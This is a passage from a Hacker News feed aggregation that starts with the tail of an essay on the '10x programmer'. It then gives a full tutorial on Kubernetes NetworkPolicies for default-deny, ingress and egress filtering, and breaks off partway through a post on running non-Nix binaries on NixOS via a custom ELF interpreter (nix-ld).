<p>When dealing with complex tasks, knowledge of data structures, fundamental limits of computation, non-trivial algorithms is going to have an impact on the ability to find a suitable design. It is not necessary to be a super expert in everything. Still, it is essential to be at least aware of a multitude of potential solutions for a problem. For example, it is possible to use algorithms which are very efficient at counting unique items in a stream, if we can accept some error percentage. Not everyone is familiar with them.</p>
<h2>Low-level understanding of the machine</h2>
<p>Many issues in programs, even when using high-level languages, arise from the misunderstanding of how the computer is going to perform a given task. Sometimes, this may lead to re-designing and re-implementing a tool from scratch because there is a fundamental problem in the tools or algorithms used. High competence in C, understanding of how CPUs work, and knowledge of how the kernel and system calls are implemented, can be essential in preventing bad, late-stage surprises.</p>
<h2>Debugging skills</h2>
<p>It is surprisingly easy to spend an enormous amount of effort to find bugs. Being able to focus on a bug incrementally and to fix it with a rational set of steps, together with having to deal with simple code that is unlikely to contain too many bugs, can have a significant effect on the programmer's efficiency.</p>
<p>In conclusion, it is not surprising to me to see how the above qualities of a programmer can have a 10x impact on the output. Combined, they allow for proper implementations of designs that start from a viable model and can be several times simpler than alternatives. There is a way to stress simplicity that I like to call “opportunistic programming.” Basically, at every development step, the set of features to implement is chosen to have the maximum impact on the user base of the program, with the minimum requirement of efforts.</p>
<p>
At <a href="https://intelligenthack.com/en" alt="Intelligent Hack" title="Intelligent Hack">Intelligent Hack</a> we are expert in affecting cultural change in development companies that want to modernize their approach to development or improve so they can scale.
We are also able to help you implement agile methodologies, better software architecture, and scaling legacy software so you can concentrate on maximizing growth for your company instead of worrying about how to support it.
Feel free to contact us if you want to have a chat at <a href="https://sklivvz.com/cdn-cgi/l/email-protection" data-cfemail="41292801282f35242d2d2826242f352920222a6f222e2c6f">[email&nbsp;protected]</a>
</p>
</div></div>]]>
            </description>
            <link>https://sklivvz.com/posts/guest-blog-the-mythical-10x-programmer-by-antirez</link>
            <guid isPermaLink="false">hacker-news-small-sites-25150827</guid>
            <pubDate>Thu, 19 Nov 2020 16:04:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Securing Kubernetes: Using Network Policies to Control Traffic in Kubernetes]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25150576">thread link</a>) | @jornjambers
<br/>
November 19, 2020 | https://in4it.io/2020/11/18/using-network-policies-to-control-traffic-in-kubernetes/ | <a href="https://web.archive.org/web/*/https://in4it.io/2020/11/18/using-network-policies-to-control-traffic-in-kubernetes/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				
<p>This is the first part of our “Kubernetes Security Series”. In this part I’m going to explain how Network Policies can help you secure your network traffic within your Kubernetes cluster.</p>



<h2>Filtering network traffic</h2>



<p>First of all, you need to think about what kind of network traffic you want to filter. The easiest way filtering traffic is on Layer 3 and 4, which is at the IP address and port level. If you’d like to filter on http/https hostname, then you’ll need Layer 7 filtering, which is currently not supported by Kubernetes Network Policies. For that, you would need a separate proxy server within your cluster.</p>



<p>On Layer 3 and 4 filtering, if you’d like to filter traffic to github.com, you’d filter based on the IP address and port 80/443 (http/https). If github.com changes IP address, you’d have to change your Network Policy rules. If you’re capable of doing Layer 7 filtering, then you could examine the hostname that passes port 80/443, and only filter if the hostname matches github.com. A sidenote: even on port 443 using https, if SNI (Server Name Indication) is used, then the hostname is passed unencrypted. SNI is currently widely used.</p>



<p>We’ll keep Layer 7 filtering for another blog post, as this is currently much more complicated, because you cannot use Network Policies for that. You would need an ingress/egress proxy that understands Layer 7 (http/https) traffic, like Envoy proxy. More traditional reverse proxies like haproxy/nginx could also be used for this.</p>



<h2>The Network Policy</h2>



<p>Let’s talk about the Network Policy itself! The NetworkPolicy resource in Kubernetes allows you to manage Layer 3 and 4 traffic on a pod level. The <a href="https://kubernetes.io/docs/concepts/services-networking/network-policies/">NetworkPolicy documentation</a> specifies 3 combinations you can use to manage traffic:</p>



<ol><li>Pod-to-pod traffic by identifying the pod using selectors (for example using pod labels)</li><li>Traffic rules based on Namespace (for example pod from namespace 1 can access all pods in namespace 2)</li><li>Rules based on IP blocks (taking into account that traffic to and from the node that the pod is running on is always allowed)</li></ol>



<figure><ul data-carousel-extra="{&quot;blog_id&quot;:1,&quot;permalink&quot;:&quot;https:\/\/in4it.io\/2020\/11\/18\/using-network-policies-to-control-traffic-in-kubernetes\/&quot;}"><li><figure><img data-attachment-id="6459" data-permalink="https://in4it.io/3-types-2-2/" data-orig-file="https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/3-types-2-edited.png?fit=2821%2C1197&amp;ssl=1" data-orig-size="2821,1197" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="3-types-2" data-image-description="" data-medium-file="https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/3-types-2-edited.png?fit=300%2C127&amp;ssl=1" data-large-file="https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/3-types-2-edited.png?fit=525%2C223&amp;ssl=1" loading="lazy" width="525" height="223" src="https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/3-types-2-edited.png?resize=525%2C223&amp;ssl=1" alt="" data-id="6459" srcset="https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/3-types-2-edited.png?w=2821&amp;ssl=1 2821w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/3-types-2-edited.png?resize=300%2C127&amp;ssl=1 300w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/3-types-2-edited.png?resize=1024%2C435&amp;ssl=1 1024w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/3-types-2-edited.png?resize=768%2C326&amp;ssl=1 768w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/3-types-2-edited.png?resize=1536%2C652&amp;ssl=1 1536w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/3-types-2-edited.png?resize=2048%2C869&amp;ssl=1 2048w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/3-types-2-edited.png?resize=1200%2C509&amp;ssl=1 1200w" sizes="(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/3-types-2-edited.png?w=2821&amp;ssl=1 2821w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/3-types-2-edited.png?resize=300%2C127&amp;ssl=1 300w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/3-types-2-edited.png?resize=1024%2C435&amp;ssl=1 1024w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/3-types-2-edited.png?resize=768%2C326&amp;ssl=1 768w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/3-types-2-edited.png?resize=1536%2C652&amp;ssl=1 1536w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/3-types-2-edited.png?resize=2048%2C869&amp;ssl=1 2048w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/3-types-2-edited.png?resize=1200%2C509&amp;ssl=1 1200w" data-lazy-src="https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/3-types-2-edited.png?resize=525%2C223&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></li></ul></figure>



<h2>Secure network traffic</h2>



<p>To secure your network traffic, you will need to disable the default behavior to allow all ingress and egress traffic. To make this easier, you can first disable ingress traffic, figure out what rules you need to make your pods working again, and then start with egress traffic restrictions. It’s going to be much more difficult to figure out egress traffic rules than ingress traffic, as it’s often not obvious what external traffic your applications will initiate.</p>



<p>A Network Policy to deny all traffic by default will look like this:</p>



<pre><code>---
<strong>apiVersion</strong>: networking.k8s.io/v1
<strong>kind</strong>: NetworkPolicy
<strong>metadata</strong>:
&nbsp;&nbsp;<strong>name</strong>: default-deny-all
<strong>spec</strong>:
&nbsp;&nbsp;<strong>podSelector</strong>: {}
&nbsp;&nbsp;<strong>policyTypes</strong>:
&nbsp;&nbsp;- Ingress
&nbsp;&nbsp;- Egress</code></pre>



<p>This rule will match all pods (podSelector: {}), and will deny ingress/egress traffic, if no other rule is in place to allow traffic.</p>



<h2>Ingress traffic</h2>



<p>Allowing ingress is the easiest to do if you have a single point of entry. This is the case if you’re using an ingress controller. You then only need to ensure access to the ingress controller, and from the ingress controller to the backend pods. Here is an example of such a NetworkPolicy:</p>



<pre><code>---
<strong>apiVersion</strong>: networking.k8s.io/v1
<strong>kind</strong>: NetworkPolicy
<strong>metadata</strong>:
&nbsp;&nbsp;<strong>name</strong>: ingress-access
<strong>spec</strong>:
&nbsp;&nbsp;<strong>podSelector</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;<strong>matchLabels</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;app.kubernetes.io/name: ingress-nginx
&nbsp;&nbsp;<strong>ingress</strong>:
&nbsp;&nbsp;- <strong>from</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;- <strong>ipBlock</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cidr: 192.168.1.0/24
---
<strong>apiVersion</strong>: networking.k8s.io/v1
<strong>kind</strong>: NetworkPolicy
<strong>metadata</strong>:
&nbsp;&nbsp;<strong>name</strong>: ingress-to-backends
<strong>spec</strong>:
&nbsp;&nbsp;<strong>podSelector</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;<strong>matchLabels</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;app: myapp
&nbsp;&nbsp;<strong>ingress</strong>:
&nbsp;&nbsp;- <strong>from</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;- <strong>namespaceSelector</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>matchLabels</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ingress: "true"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>podSelector</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>matchLabels</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;app.kubernetes.io/name: ingress-nginx</code></pre>



<p>There are 2 rules here. The first rule, called “ingress-access” will be applicable on pods that have the label app.kubernetes.io/name=ingress-nginx. Pods that match will allow traffic from 192.168.1.0/24. This IP range could be your local IP range if you’re using minikube, or a Virtual Private Cloud network range on cloud providers. In those ranges you typically run the LoadBalancer which needs access to the ingress controller. If you’re not using a cloud Load Balancer, then it can even be 0.0.0.0/0 in case you want to let everyone access your ingress controller.<br></p>



<p>Once traffic hits the ingress controller, it’ll proxy the requests to the backend services. We need to allow traffic between this ingress controller and the backend services, which can be done using the second NetworkPolicy, in our example “ingress-to-backends”. This rule matches the pods with the label “app=myapp”. You can make this a more generic label that you assign to all your backend pods. These pods need to allow traffic from the ingress controller, so we specify an “ingress” rule with “from” to match the namespace (ingress=true) and the pod with the label “app.kubernetes.io/name=ingress-nginx). Make sure to label the namespace where your ingress controller is running in to make this work. The end result should be something like this:</p>



<figure><ul data-carousel-extra="{&quot;blog_id&quot;:1,&quot;permalink&quot;:&quot;https:\/\/in4it.io\/2020\/11\/18\/using-network-policies-to-control-traffic-in-kubernetes\/&quot;}"><li><figure><img data-attachment-id="6460" data-permalink="https://in4it.io/ingress-2/" data-orig-file="https://i1.wp.com/in4it.io/wp-content/uploads/2020/11/ingress-edited.png?fit=2895%2C956&amp;ssl=1" data-orig-size="2895,956" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="ingress" data-image-description="" data-medium-file="https://i1.wp.com/in4it.io/wp-content/uploads/2020/11/ingress-edited.png?fit=300%2C99&amp;ssl=1" data-large-file="https://i1.wp.com/in4it.io/wp-content/uploads/2020/11/ingress-edited.png?fit=525%2C173&amp;ssl=1" loading="lazy" width="525" height="173" src="https://i1.wp.com/in4it.io/wp-content/uploads/2020/11/ingress-edited.png?resize=525%2C173&amp;ssl=1" alt="" data-id="6460" srcset="https://i1.wp.com/in4it.io/wp-content/uploads/2020/11/ingress-edited.png?w=2895&amp;ssl=1 2895w, https://i1.wp.com/in4it.io/wp-content/uploads/2020/11/ingress-edited.png?resize=300%2C99&amp;ssl=1 300w, https://i1.wp.com/in4it.io/wp-content/uploads/2020/11/ingress-edited.png?resize=1024%2C338&amp;ssl=1 1024w, https://i1.wp.com/in4it.io/wp-content/uploads/2020/11/ingress-edited.png?resize=768%2C254&amp;ssl=1 768w, https://i1.wp.com/in4it.io/wp-content/uploads/2020/11/ingress-edited.png?resize=1536%2C507&amp;ssl=1 1536w, https://i1.wp.com/in4it.io/wp-content/uploads/2020/11/ingress-edited.png?resize=2048%2C676&amp;ssl=1 2048w, https://i1.wp.com/in4it.io/wp-content/uploads/2020/11/ingress-edited.png?resize=1200%2C396&amp;ssl=1 1200w" sizes="(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/in4it.io/wp-content/uploads/2020/11/ingress-edited.png?w=2895&amp;ssl=1 2895w, https://i1.wp.com/in4it.io/wp-content/uploads/2020/11/ingress-edited.png?resize=300%2C99&amp;ssl=1 300w, https://i1.wp.com/in4it.io/wp-content/uploads/2020/11/ingress-edited.png?resize=1024%2C338&amp;ssl=1 1024w, https://i1.wp.com/in4it.io/wp-content/uploads/2020/11/ingress-edited.png?resize=768%2C254&amp;ssl=1 768w, https://i1.wp.com/in4it.io/wp-content/uploads/2020/11/ingress-edited.png?resize=1536%2C507&amp;ssl=1 1536w, https://i1.wp.com/in4it.io/wp-content/uploads/2020/11/ingress-edited.png?resize=2048%2C676&amp;ssl=1 2048w, https://i1.wp.com/in4it.io/wp-content/uploads/2020/11/ingress-edited.png?resize=1200%2C396&amp;ssl=1 1200w" data-lazy-src="https://i1.wp.com/in4it.io/wp-content/uploads/2020/11/ingress-edited.png?resize=525%2C173&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>ingress traffic flow</figcaption></figure></li></ul></figure>



<h2>Egress traffic</h2>



<p>Traffic originating from a pod will be controlled by the egress NetworkPolicy rules. The typical application will need to do DNS lookups (translating for example google.com to an IP address) before making a request to an external server. The DNS server typically runs within the Kubernetes cluster, so that’ll be the first rule you need when blocking all egress traffic. Below is an example of such a rule that blocks all egress traffic, but allows DNS traffic to the DNS pods running in the kube-system namespace (kube-system needs to be labelled with kube-dns: “true”):</p>



<pre><code><strong>apiVersion</strong>: networking.k8s.io/v1
<strong>kind</strong>: NetworkPolicy
<strong>metadata</strong>:
&nbsp;&nbsp;<strong>name</strong>: deny-egress-allow-dns
<strong>spec</strong>:
&nbsp;&nbsp;<strong>podSelector</strong>: {}
&nbsp;&nbsp;<strong>policyTypes</strong>:
&nbsp;&nbsp;- <strong>Egress</strong>
&nbsp;&nbsp;<strong>egress</strong>:
&nbsp;&nbsp;- <strong>to</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;- <strong>namespaceSelector</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>matchLabels</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;kube-dns: "true"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>podSelector</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>matchLabels</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;k8s-app: kube-dns
&nbsp;&nbsp;&nbsp;&nbsp;<strong>ports</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;- <strong>protocol</strong>: TCP
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>port</strong>: 53
&nbsp;&nbsp;&nbsp;&nbsp;- <strong>protocol</strong>: UDP
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>port</strong>: 53</code></pre>



<p>Once this Network Policy is in place, you’ll need to make sure you have an egress rule for every outgoing connection that any pod in the Kubernetes cluster can make. If an application uses for example an external API for transactional emails, or connects to external cloud services, then you’ll need a Network Policy covering this.</p>



<p>Most cloud services will have a list of IP addresses and IP ranges, which you can use to whitelist egress traffic. It can definitely be a long process to get it right if you have a lot of external dependencies. Once you deny all egress traffic by default, you’ll need to do some testing to trigger all the external endpoints and test whether they still work.</p>



<p>Below is an example rule to allow https (port 443) traffic to a specific IP address.</p>



<pre><code>---
<strong>apiVersion</strong>: networking.k8s.io/v1
<strong>kind</strong>: NetworkPolicy
<strong>metadata</strong>:
&nbsp;&nbsp;name: egress-access-myapp
<strong>spec</strong>:
&nbsp;&nbsp;<strong>podSelector</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;<strong>matchLabels</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;app: myapp
&nbsp;&nbsp;<strong>egress</strong>:
&nbsp;&nbsp;- <strong>to</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;- <strong>ipBlock</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>cidr</strong>: 1.1.1.1/32
&nbsp;&nbsp;&nbsp;<strong>ports</strong>:
&nbsp;&nbsp;&nbsp;&nbsp;- <strong>protocol</strong>: TCP
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>port</strong>: 443</code></pre>



<p>After applying this NetworkPolicy, the pod with the label app=myapp will be able to access hostnames that resolve to the IP address 1.1.1.1 (a CloudFlare IP) on port 443. This diagram summarizes our setup after applying both Network Policies:</p>



<figure><ul data-carousel-extra="{&quot;blog_id&quot;:1,&quot;permalink&quot;:&quot;https:\/\/in4it.io\/2020\/11\/18\/using-network-policies-to-control-traffic-in-kubernetes\/&quot;}"><li><figure><img data-attachment-id="6461" data-permalink="https://in4it.io/egress-2/" data-orig-file="https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/egress-edited.png?fit=2308%2C1203&amp;ssl=1" data-orig-size="2308,1203" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="egress" data-image-description="" data-medium-file="https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/egress-edited.png?fit=300%2C156&amp;ssl=1" data-large-file="https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/egress-edited.png?fit=525%2C274&amp;ssl=1" loading="lazy" width="525" height="274" src="https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/egress-edited.png?resize=525%2C274&amp;ssl=1" alt="" data-id="6461" srcset="https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/egress-edited.png?w=2308&amp;ssl=1 2308w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/egress-edited.png?resize=300%2C156&amp;ssl=1 300w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/egress-edited.png?resize=1024%2C534&amp;ssl=1 1024w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/egress-edited.png?resize=768%2C400&amp;ssl=1 768w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/egress-edited.png?resize=1536%2C801&amp;ssl=1 1536w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/egress-edited.png?resize=2048%2C1067&amp;ssl=1 2048w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/egress-edited.png?resize=1200%2C625&amp;ssl=1 1200w" sizes="(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/egress-edited.png?w=2308&amp;ssl=1 2308w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/egress-edited.png?resize=300%2C156&amp;ssl=1 300w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/egress-edited.png?resize=1024%2C534&amp;ssl=1 1024w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/egress-edited.png?resize=768%2C400&amp;ssl=1 768w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/egress-edited.png?resize=1536%2C801&amp;ssl=1 1536w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/egress-edited.png?resize=2048%2C1067&amp;ssl=1 2048w, https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/egress-edited.png?resize=1200%2C625&amp;ssl=1 1200w" data-lazy-src="https://i0.wp.com/in4it.io/wp-content/uploads/2020/11/egress-edited.png?resize=525%2C274&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>egress traffic flow</figcaption></figure></li></ul></figure>



<p>This article shows you how to filter Layer 3 and 4 traffic using NetworkPolicies. Unfortunately at the time of writing, there’s no Layer 7 support in NetworkPolicies. To filter on http/https hostname or other protocols, we would need to redirect all the traffic through an egress proxy/gateway – which we’ll explain in another blog post!</p>
			</div></div>]]>
            </description>
            <link>https://in4it.io/2020/11/18/using-network-policies-to-control-traffic-in-kubernetes/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25150576</guid>
            <pubDate>Thu, 19 Nov 2020 15:39:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On-demand linked libraries for Nix]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25150572">thread link</a>) | @fanf2
<br/>
November 19, 2020 | https://fzakaria.com/2020/11/17/on-demand-linked-libraries-for-nix.html | <a href="https://web.archive.org/web/*/https://fzakaria.com/2020/11/17/on-demand-linked-libraries-for-nix.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
      <blockquote>
  <p>This is a write up of some discussion ongoing with some folks on the <a href="irc://irc.freenode.net/nix-community">#nix-community</a> IRC chat primarily being driven by <a href="https://github.com/Mic92">Mic92</a>.</p>
</blockquote>

<p>Nixpkgs maintains the highest rating on <a href="https://repology.org/">Repology</a> for having the most packages &amp; which are up to date. Unfortunately even with the current ecosystem of packages, there will always be gaps, and for beginners in NixOS a common question is:</p>

<p><em>“I’ve download a binary and would like to run it on NixOS”</em></p>

<blockquote>
  <p>Take a look at this graph <a href="https://repology.org/repositories/graphs">https://repology.org/repositories/graphs</a></p>
</blockquote>

<p><img src="https://fzakaria.com/assets/images/repology.svg" alt="repology graph"></p>

<p><strong>Can we do better &amp; streamline running non-Nix software?</strong> 🤔</p>

<p>This was some of the questions posed by some Nix contributors and I wanted to capture the ideas put forward for others.</p>

<!--more-->

<h2 id="a-brief-tour-of-linking">A brief tour of linking</h2>

<p>Without going into a ton of detail about how dynamic libraries are performed on Linux; a Linux binary - <a href="https://en.wikipedia.org/wiki/Executable_and_Linkable_Format">ELF format</a> - contains information pertaining to the dynamic libraries necessary for the binary.</p>

<p>For instance, here is a non-NixOS Ruby installation.</p>
<div><div><pre><code>❯ readelf <span>-d</span> <span>$(</span>which ruby<span>)</span> | <span>grep </span>NEEDED
 0x0000000000000001 <span>(</span>NEEDED<span>)</span>             Shared library: <span>[</span>libruby-2.7.so.2.7]
 0x0000000000000001 <span>(</span>NEEDED<span>)</span>             Shared library: <span>[</span>libc.so.6]
</code></pre></div></div>
<p>It requires two dynamic libraries <em>libruby</em> &amp; <em>libc</em>. These libraries may themselves have other dependencies, so we can use <strong>ldd</strong> to recursively find the dependency closure.</p>

<div><div><pre><code>❯ ldd <span>$(</span>which ruby<span>)</span>
    linux-vdso.so.1 <span>(</span>0x00007ffed1705000<span>)</span>
    /lib/x86_64-linux-gnu/libnss_cache.so.2 <span>(</span>0x00007f3626cd0000<span>)</span>
    libruby-2.7.so.2.7 <span>=&gt;</span> /lib/x86_64-linux-gnu/libruby-2.7.so.2.7 <span>(</span>0x00007f3626960000<span>)</span>
    libc.so.6 <span>=&gt;</span> /lib/x86_64-linux-gnu/libc.so.6 <span>(</span>0x00007f362679b000<span>)</span>
    libpthread.so.0 <span>=&gt;</span> /lib/x86_64-linux-gnu/libpthread.so.0 <span>(</span>0x00007f3626779000<span>)</span>
    librt.so.1 <span>=&gt;</span> /lib/x86_64-linux-gnu/librt.so.1 <span>(</span>0x00007f362676e000<span>)</span>
    libgmp.so.10 <span>=&gt;</span> /lib/x86_64-linux-gnu/libgmp.so.10 <span>(</span>0x00007f36266eb000<span>)</span>
    libdl.so.2 <span>=&gt;</span> /lib/x86_64-linux-gnu/libdl.so.2 <span>(</span>0x00007f36266e3000<span>)</span>
    libcrypt.so.1 <span>=&gt;</span> /lib/x86_64-linux-gnu/libcrypt.so.1 <span>(</span>0x00007f36266a8000<span>)</span>
    libm.so.6 <span>=&gt;</span> /lib/x86_64-linux-gnu/libm.so.6 <span>(</span>0x00007f3626564000<span>)</span>
    /lib64/ld-linux-x86-64.so.2 <span>(</span>0x00007f3626cde000<span>)</span>
</code></pre></div></div>

<p>We can see here that <strong>ldd</strong> resolved the libraries to locations in my <a href="https://en.wikipedia.org/wiki/Filesystem_Hierarchy_Standard">Filesystem Hierarchy Standard</a>(FHS).</p>

<p>This is <em>not hermetic</em>, as the FHS is a global shared state across my machine.
This is the exact problem that Nix itself wants to address.</p>

<blockquote>
  <p>I’m on a Debian distro at the moment.</p>
</blockquote>

<p>Nix addresses this generally by patching the ELF header to <em>fully specify</em> where the shared libraries can be found in the <em>/nix/store</em>; so that they are not resolved or searched on the FHS.</p>

<div><div><pre><code>❯ readelf -d $(which ruby) | grep RUNPATH
 0x000000000000001d (RUNPATH) Library runpath:
 [/nix/store/z5lira1853d97gbmv1qbdjjpkjn7ksj8-ruby-2.6.6/lib:
 /nix/store/8fcxqg8dmwlkjw2vgkgz607kr5jy552w-zlib-1.2.11/lib:
 /nix/store/kah5n342wz4i0s9lz9ka4bgz91xa2i94-glibc-2.32/lib]
</code></pre></div></div>

<p>This <em>patching</em> however relies on the Nix <em>stdenv</em> derivation builder and ultimately is what makes binaries in Nix work.</p>

<blockquote>
  <p>Nix actually takes it a step further and patches the linker so that it does not even try to check the FHS.</p>
</blockquote>

<p>Binaries downloaded from the Internet are not patched. What can be done?</p>

<h2 id="interpreter">Interpreter</h2>

<p>A key insight into the bootstrapping of an ELF binary in Linux is the <em>interpreter</em>, whose presence is there to help satisfy any dynamic linkage.</p>

<p>Let’s take a look again at my non-Nix Ruby binary</p>

<div><div><pre><code>❯ readelf <span>-l</span> <span>$(</span>which ruby<span>)</span> | <span>grep </span>interpreter
      <span>[</span>Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
</code></pre></div></div>

<blockquote>
  <p>Nix built binaries use a <a href="https://github.com/NixOS/patchelf">patchelf</a> utility that not only sets the <em>RUNPATH</em> to pin libraries but also changes the interpreter to one in the <em>/nix/store</em></p>
</blockquote>

<p>It is the interpreter’s goal to find the libraries listed in the ELF file either via the <em>RUNPATH</em>, <em>LD_LIBRARY_PATH</em> or the <em>FHS</em> well known directories.</p>

<p>⚠️ On NixOS <code>/lib64/ld-linux-x86-64.so.2</code> normally <strong>does not exist</strong> and as a result you will be greeted with an unfriendly <em>“bad ELF interpreter: No such file or directory”</em> error.</p>

<h2 id="nix-ld">nix-ld</h2>

<p>We have a binary that needs some shared libraries &amp; the bootstrapping process calls out to the interpreter set in the ELF header.</p>

<p>💡 Let’s put a <em>fake</em> interpreter on NixOS machines!</p>

<blockquote>
  <p>This idea works since the path of Linux <em>ld</em> is well known for each distribution.</p>
</blockquote>

<p>For instance, NixOS machines can place an entry at <em>/lib64/ld-linux-x86-64.so.2</em> for a custom binary that can help resolve dynamic libraries <strong>at runtime</strong> to libraries within the <em>/nix/store</em>.</p>

<p>This is in fact what <a href="https://github.com/Mic92">Mic92</a> has started with his project <a href="https://github.com/Mic92/nix-ld">nix-ld</a>.</p>

<p>How can our custom <em>ld</em> locate the necessary libraries though? This is where we can get really crazy. 🤪</p>

